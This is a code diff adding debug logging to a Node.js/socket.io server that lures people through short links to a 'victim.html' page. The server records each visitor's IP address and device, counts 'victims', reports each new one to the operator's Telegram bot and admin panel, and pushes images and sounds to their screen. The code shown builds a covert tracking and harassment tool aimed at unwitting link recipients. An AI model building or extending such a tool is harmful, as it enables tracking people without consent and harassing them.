@@ -82,11 +82,16 @@ function parseDevice(ua) {
 // API для получения session ID по короткому коду
 app.get('/api/resolve/:shortCode', (req, res) => {
     const code = req.params.shortCode;
+    console.log('📡 API Request: /api/resolve/' + code);
+    console.log('📋 Available short links:', Object.keys(global.shortLinks));
+    
     const sessionId = global.shortLinks[code];
     
     if (sessionId) {
+        console.log('✅ Short code found:', code, '→', sessionId);
         res.json({ success: true, sessionId: sessionId });
     } else {
+        console.log('❌ Short code NOT found:', code);
         res.json({ success: false, error: 'Session not found' });
     }
 });
@@ -100,16 +105,24 @@ app.get('/', (req, res) => {
 app.get('/:shortCode', (req, res) => {
     const code = req.params.shortCode;
     
+    console.log('🔗 Short link request:', code);
+    
     // Ігноруємо статичні файли
     if (code === 'favicon.ico' || code.includes('.')) {
+        console.log('⏭ Skipping static file:', code);
         return res.sendStatus(404);
     }
 
     const sessionId = global.shortLinks[code];
+    console.log('🔍 Looking up short code:', code);
+    console.log('📋 Available codes:', Object.keys(global.shortLinks));
+    
     if (sessionId) {
+        console.log('✅ Short code found! Serving victim.html for session:', sessionId);
         // Отправляем victim.html напрямую с коротким кодом вместо редиректа
         res.sendFile(path.join(__dirname, 'public', 'victim.html'));
     } else {
+        console.log('❌ Short code NOT found:', code);
         res.status(404).send(`
 <!DOCTYPE html>
 <html>
@@ -173,6 +186,21 @@ io.on('connection', (socket) => {
     // Жертва
     socket.on('join-room-victim', (data) => {
         const roomId = data.roomId;
+        
+        console.log('👤 Victim joining room:', roomId);
+        console.log('📋 Session exists?', !!global.sessions[roomId]);
+        
+        if (global.sessions[roomId]) {
+            console.log('📦 Session data:', {
+                id: global.sessions[roomId].id,
+                shortCode: global.sessions[roomId].shortCode,
+                hasImage: !!global.sessions[roomId].image,
+                hasSound: !!global.sessions[roomId].sound,
+                image: global.sessions[roomId].image,
+                sound: global.sessions[roomId].sound
+            });
+        }
+        
         socket.join(roomId);
         
         const ip = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address).split(',')[0].trim();
@@ -188,12 +216,15 @@ io.on('connection', (socket) => {
 
         if (global.sessions[roomId]) {
             global.sessions[roomId].totalVictims++;
+            console.log('📡 Broadcasting media to victim...');
             broadcastUpdate(roomId);
             
             // Отправляем уведомление в Telegram бот
             if (notifyNewVictim) {
                 notifyNewVictim(roomId, victimInfo);
             }
+        } else {
+            console.log('⚠️ Session not found for room:', roomId);
         }
 
         sendVictimListToAdmin(roomId);
@@ -216,10 +247,21 @@ function sendVictimListToAdmin(roomId) {
 
 function broadcastUpdate(roomId) {
     const s = global.sessions[roomId];
-    if (!s) return;
+    if (!s) {
+        console.log('⚠️ broadcastUpdate: session not found for', roomId);
+        return;
+    }
 
     const currentSound = s.sound || '';
     const currentImage = s.image || '';
+
+    console.log('📡 Broadcasting media update:', {
+        roomId: roomId,
+        hasSound: !!currentSound,
+        hasImage: !!currentImage,
+        sound: currentSound,
+        image: currentImage
+    });
 
     s.lastActiveAt = Date.now();
     
@@ -228,6 +270,8 @@ function broadcastUpdate(roomId) {
         sound: currentSound, 
         image: currentImage
     });
+    
+    console.log('✅ Media update sent to room:', roomId);
 }
 
 // --- START ---
